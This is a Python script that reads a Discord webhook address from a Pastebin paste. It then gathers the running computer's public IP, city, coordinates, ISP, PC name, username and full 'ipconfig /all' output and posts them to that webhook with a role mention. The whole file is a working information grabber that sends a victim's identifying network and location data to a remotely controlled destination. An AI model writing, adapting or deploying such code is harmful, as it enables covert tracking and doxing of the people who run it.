import requests
import json
from datetime import datetime
import os
import getpass
import subprocess
import sys

# Fetching the webhook URL from the Pastebin raw link
pastebin_raw_url = '(in pastebin paste there needs to be only webhook url)'
response = requests.get(pastebin_raw_url)

if response.status_code == 200:
    webhook_url = response.text.strip()
    print(f"Fetched webhook URL: {webhook_url}")
else:
    print(f"Failed to fetch webhook URL. Status code: {response.status_code}")
    exit()

# Fetching user's IP info including country, city, and ISP
try:
    ip_info_response = requests.get('https://ipinfo.io')
    if ip_info_response.status_code == 200:
        ip_info = ip_info_response.json()
        country = ip_info.get('country', 'Unknown')
        city = ip_info.get('city', 'Unknown')
        isp = ip_info.get('org', 'Unknown ISP')
        coordinates = ip_info.get('loc', 'Coordinates not found').split(',')
        latitude = "{:.6f}".format(float(coordinates[0])) if len(coordinates) >= 1 else 'Unknown'
        longitude = "{:.6f}".format(float(coordinates[1])) if len(coordinates) >= 2 else 'Unknown'
        
        # Added line for IPv4 information
        ipv4 = ip_info.get('ip', 'Unknown')
        
        print(f"Detected Country: {country}")
        print(f"IPv4: {ipv4}")
        print(f"Detected City: {city}")
        print(f"Detected ISP: {isp}")
        print(f"Location: {latitude}, {longitude}")
    else:
        country = 'Unknown'
        city = 'Unknown'
        isp = 'Unknown ISP'
        latitude = 'Unknown'
        longitude = 'Unknown'
        print(f"Failed to fetch IP info. Status code: {ip_info_response.status_code}")
except Exception as e:
    country = 'Unknown'
    city = 'Unknown'
    isp = 'Unknown ISP'
    latitude = 'Unknown'
    longitude = 'Unknown'
    print(f"Failed to fetch IP info: {str(e)}")

# Get PC name and user account name
pc_name = os.getenv('COMPUTERNAME', 'Unknown')
user_account = getpass.getuser()

# Execute ipconfig /all command and save output to a text file if 'ipcon_off' argument is not present
try:
    attach_ipconfig = True  # Set default value to True

    # Check if the script was run with 'ipcon_off' argument or any message
    if len(sys.argv) > 1:
        if sys.argv[1] == 'ipcon_off':
            attach_ipconfig = False

    if attach_ipconfig:
        ipconfig_output = subprocess.run(['ipconfig', '/all'], capture_output=True, text=False)
        ipconfig_log = ipconfig_output.stdout.decode('cp850', errors='replace')
        with open('ipconfig_log.txt', 'w', encoding='utf-8') as file:
            file.write(ipconfig_log)
        print("ipconfig /all log saved as ipconfig_log.txt")
    else:
        print("ipconfig /all log attachment disabled")
except Exception as e:
    print(f"Failed to generate ipconfig log: {str(e)}")

# Prepare the message based on the command line arguments
current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
additional_message = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else ""

message = f"<@&(discord role id)> {current_datetime}"
if additional_message:
    message += f" | {additional_message}"
message += f"\n```Country: {country}\nIPv4: {ipv4}\nCity: {city}\nISP: {isp}\nLocation: {latitude}, {longitude}\nPC Name: {pc_name}\nUser Account: {user_account}```"

# Sending message to the fetched webhook URL with or without ipconfig log attachment
data = {
    "content": message
}

files = {}
if attach_ipconfig:
    files = {
        'file': open('ipconfig_log.txt', 'rb')
    }

headers = {
    'Content-Type': 'multipart/form-data'
}

response = requests.post(webhook_url, data=data, files=files)

if response.status_code == 204:
    print("Message sent successfully to Discord!")
else:
    print(f"Failed to send message. Status code: {response.status_code}")
    print(response.text)
